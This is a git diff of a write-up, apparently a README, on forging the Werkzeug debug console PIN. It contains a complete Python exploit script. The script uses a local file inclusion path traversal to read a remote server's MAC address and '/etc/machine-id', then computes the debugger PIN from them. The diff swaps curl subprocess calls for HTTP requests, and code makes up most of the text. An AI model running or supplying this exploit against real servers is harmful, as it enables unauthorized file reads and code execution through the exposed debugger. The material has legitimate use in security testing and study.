@@ -17,7 +17,7 @@ Here you can find how to generate this pin:
 ## Generating the pin
 These exploits were developed after reviewing [Werkzeug source code repo](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/__init__.py) to better understand how the code is generated to then reverse it.
 
-The following is the function that generates the pin in Werkzeug from __init__.py.
+The following is the function that generates the pin in Werkzeug from ```__init__.py```.
 
 ```python
 def get_pin_and_cookie_name(app):
@@ -121,7 +121,7 @@ Where:
 * `uuid.getnode()` is the MAC address of the current computer, `str (uuid.getnode ())` is the decimal expression of the mac address
 * `get_machine_id()` read the value in `/etc/machine-id` or `/proc/sys/kernel/random/boot_id` and return directly if there is, sometimes it might be required to append a piece of information within `/proc/self/cgroup` that you find at the end of the first line \(after the third slash\)
 
-To find server MAC address, need to know which network interface is being used to serve the app \(e.g. `ens3`\). If unknown, leak `/proc/net/arp` for device ID and then leak MAC address at `/sys/class/net/<inface>/address`.
+To find server MAC address, need to know which network interface is being used to serve the app \(e.g. `ens3`\). If unknown, leak `/proc/net/arp` for device ID and then leak MAC address at `/sys/class/net/<iface>/address`.
 
 As an example, the MAC address has to be converted from base16 (*Hexadecimal*) interger to a base10 interger (*decimal*).
 For example:
@@ -135,27 +135,38 @@ For example:
 Instead of writing the script with the explicit values, we relied on check_output to return the values from the HTTP request performed by curl. The HTTP requests will retrieve the *MAC Address* and the *machine-id* by relying on a *local file inclusion* vulnerability
 
 ```python
-user = ''   # Username to authenticate to Werkzeug
-passwd = '' # Password to authenticate to Werkzeug
-iface = ''  # Interface name from the remote system (ens33, eth{0,1,...}, etc)
-rhost = ''  # IP address or hostname of the remote system hosting Werkzeug
-rport = ''  # Remote Port number of the service to access should be an integer, not a string.
-lfi_page_dir = ''
+USER = ''   # Username to authenticate to Werkzeug
+PASSWD = '' # Password to authenticate to Werkzeug
+WERK_USER = ''  # User Werkzeug runs as. Could be the same as the user for the HTTP Request.
 
-werk_user = ''  # User Werkzeug runs as. Could be the same as the user for the HTTP Request.
+IFACE = ''  # Interface name from the remote system (ens33, eth{0,1,...}, etc)
+RHOST = ''  # IP address or hostname of the remote system hosting Werkzeug
+RPORT = ''  # Remote Port number of the service to access should be an integer, not a string.
 
-maccmd = "/usr/bin/curl -sX GET \
-    --url 'http://{2}:{3}/{4}?filename=../../../../../sys/class/net/{5}/address' \
-        -u '{0}:{1}' | tr -d ':' | tr -d '\n'"
-idcmd = "/usr/bin/curl -sX GET \
-    --url 'http://{2}:{3}}/{4}?filename=../../../../../etc/machine-id' \
-        -u '{0}:{1}' | tr -d '\n'"
+LFI_PAGE_DIR = ''   # Directory or page that allows LFI
+mac_path = '../../../../../sys/class/net/{0}/address'.format(IFACE) # Path to Mac Address
+id_path = '../../../../../etc/machine-id'   # Path to Machine-ID
+url = 'http://{0}:{1}/{2}?filename='.format(RHOST, RPORT, LFI_PAGE_DIR)
 
-maccmd.format(user, passwd, rhost, rport, lfi_page_dir, iface)
-idcmd.format(user, passwd, rhost, rport, lfi_page_dir)
+payload = {}
+headers = {
+    'Authorization': 'Basic {0}'.format(b64encode("{0}:{1}".format(
+        USER, 
+        PASSWD).encode('UTF-8')).decode('ascii'))
+}
 
-get_node = str(int(subprocess.check_output(maccmd.strip(), shell=True, text=True), base=16))
-get_machine_id = subprocess.check_output(idcmd.strip(), shell=True, text=True)
+get_node = str(int(request(
+    "GET",
+    url + mac_path,
+    headers=headers,
+    data=payload).text.strip().replace(':', ''), base=16))
+
+get_machine_id = request(
+    "GET",
+    url + id_path,
+    headers=headers,
+    data=payload
+    ).text.strip()
 ```
 
 * user -> Username to authenticate to Werkzeug
@@ -165,8 +176,8 @@ get_machine_id = subprocess.check_output(idcmd.strip(), shell=True, text=True)
 * rport -> Remote Port number of the service to access should be an integer, not a string.
 * lfi_page_dir -> The page or directory to exploit LFI
 * werk_user -> User Werkzeug runs as, or the user Flask was launched. Could be the same as the user for the HTTP Request.
-* get_node -> will execute the OS command and retrieve the output which is the MAC Address of the interface listening, to then strip any potential trailing newlines that were not remove by ```tr -d '\n'```. Then it will cast the string output to a decimal interger by specifying its base as hexadecimal. This corresponds to ```uuid.getnode() -> /sys/class/net/<interface>/address```.
-* get_machine_id -> will execute the OS command and retrieve the output which in this case is the machine-id. This corresponds to ```get_machine_id() -> /etc/machine-id```.
+* get_node -> will make a HTTP request to retrieve the MAC Address of the listening interface, to then strip any potential trailing newlines and colons. Then it will cast the string output to a decimal interger by specifying its base as hexadecimal. This corresponds to ```uuid.getnode() -> /sys/class/net/<interface>/address```.
+* get_machine_id -> will make a HTTP request to retrieve the machine-id. This corresponds to ```get_machine_id() -> /etc/machine-id```.
 
 The interfaces on the server hosting Werkzeug can be retrieved by using something like:
 
@@ -178,7 +189,7 @@ The following are the variables mentioned which now use the specific variables s
 
 ```python
 probably_public_bits = [
-    werk_user,
+    WERK_USER,
     'flask.app',
     'Flask',
     '/usr/local/lib/python2.7/dist-packages/flask/app.pyc'
@@ -195,44 +206,60 @@ private_bits = [
 ```python
 #!/usr/bin/env python3
 
-import subprocess
-import hashlib
+from requests import request
+from hashlib import md5
+from base64 import b64encode
 from itertools import chain
 
-user = ''
-passwd = ''
-iface = ''
-rhost = ''
-rport = ''
-lfi_page_dir = ''
-werk_user = ''
+USER = ''   # Username to authenticate to Werkzeug
+PASSWD = '' # Password to authenticate to Werkzeug
+WERK_USER = ''  # User Werkzeug runs as. Could be the same as the user for the HTTP Request.
 
-maccmd = "/usr/bin/curl -sX GET \
-    --url 'http://{2}:{3}/{4}?filename=../../../../../sys/class/net/{5}/address' \
-        -u '{0}:{1}' | tr -d ':' | tr -d '\n'"
-idcmd = "/usr/bin/curl -sX GET \
-    --url 'http://{2}:{3}}/{4}?filename=../../../../../etc/machine-id' \
-        -u '{0}:{1}' | tr -d '\n'"
+IFACE = ''  # Interface name from the remote system (ens33, eth{0,1,...}, etc)
+RHOST = ''  # IP address or hostname of the remote system hosting Werkzeug
+RPORT = ''  # Remote Port number of the service to access should be an integer, not a string.
 
-maccmd.format(user, passwd, rhost, rport, lfi_page_dir, iface)
-idcmd.format(user, passwd, rhost, rport, lfi_page_dir)
+LFI_PAGE_DIR = ''   # Directory or page that allows LFI
+mac_path = '../../../../../sys/class/net/{0}/address'.format(IFACE) # Path to Mac Address
+id_path = '../../../../../etc/machine-id'   # Path to Machine-ID
+url = 'http://{0}:{1}/{2}?filename='.format(RHOST, RPORT, LFI_PAGE_DIR)
 
-get_node = str(int(subprocess.check_output(maccmd.strip(), shell=True, text=True), base=16))
-get_machine_id = subprocess.check_output(idcmd.strip(), shell=True, text=True)
+payload = {}
+headers = {
+    'Authorization': 'Basic {0}'.format(b64encode("{0}:{1}".format(
+        USER, 
+        PASSWD).encode('UTF-8')).decode('ascii'))
+}
+
+get_node = str(int(request(
+    "GET",
+    url + mac_path,
+    headers=headers,
+    data=payload).text.strip().replace(':', ''), base=16))
+
+get_machine_id = request(
+    "GET",
+    url + id_path,
+    headers=headers,
+    data=payload
+    ).text.strip()
 
 probably_public_bits = [
-    werk_user,
+    WERK_USER,
     'flask.app',
     'Flask',
     '/usr/local/lib/python2.7/dist-packages/flask/app.pyc'
     ]
 
+# uuid.getnode() -> /sys/class/net/<interface>/address
+# get_machine_id() -> /etc/machine-id
+# private_bits = [str(uuid.getnode()), get_machine_id()]
 private_bits = [
     get_node,
     get_machine_id
     ]
 
-h = hashlib.md5()
+h = md5()
 for bit in chain(probably_public_bits, private_bits):
     if not bit:
         continue
@@ -240,6 +267,7 @@ for bit in chain(probably_public_bits, private_bits):
         bit = bit.encode('utf-8')
     h.update(bit)
 h.update(b'cookiesalt')
+#h.update(b'shittysalt')
 
 cookie_name = '__wzd' + h.hexdigest()[:20]
 
@@ -253,10 +281,11 @@ if rv is None:
     for group_size in 5, 4, 3:
         if len(num) % group_size == 0:
             rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
-                          for x in range(0, len(num), group_size))
+                            for x in range(0, len(num), group_size))
             break
     else:
         rv = num
 
 print(rv)
+
 ```
